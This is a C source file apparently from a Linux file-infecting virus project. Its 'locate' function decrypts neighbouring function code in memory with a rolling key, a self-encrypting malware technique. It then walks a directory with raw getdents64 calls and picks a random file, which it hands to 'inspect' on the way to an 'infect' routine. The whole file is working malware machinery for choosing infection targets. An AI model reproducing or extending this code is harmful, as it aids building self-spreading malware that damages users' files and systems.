#include "war.h"
#include <string.h>

void	locate(t_data *data, t_directory *dir)
{
	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
	update_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
	printf("locate key = %lx\n", data->key.one);

	int				fd;
	int				stop;
	int				limit;
	char			buf[PATH_MAX];
	char			path[BUFF_SIZE] = {0};
	linux_dirent64 *curr = NULL;

	data->context = false;
	if (memcpy(path, dir->path[dir->entry], strlen(dir->path[dir->entry])) != path)
		goto ERR;
	if ((fd = open(path, O_RDONLY)) < 0)
		goto ERR;
   	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			dir->entry++;
		}
	}
	if (close(fd) < 0)
		goto ERR;
	if (dir->entry <= 0)
		goto ERR;

TRUC:
	if ((fd = open(path, O_RDONLY)) < 0)
		goto ERR;
	if ((stop = random_number(dir->entry)) < 0)
		goto ERR;

	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			if (stop == 0)
				break ;
			stop--;
		}
		if (stop == 0)
			break ;
	}
	if (close(fd) < 0)
		goto ERR;

	if (*curr->d_name == '.')
		goto TRUC;

	limit = strlen(path);
	path[limit++] = '/';
	memcpy(path + limit, curr->d_name, strlen(curr->d_name));
	data->context = true;

ERR:
	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
	inspect(data, path);
}
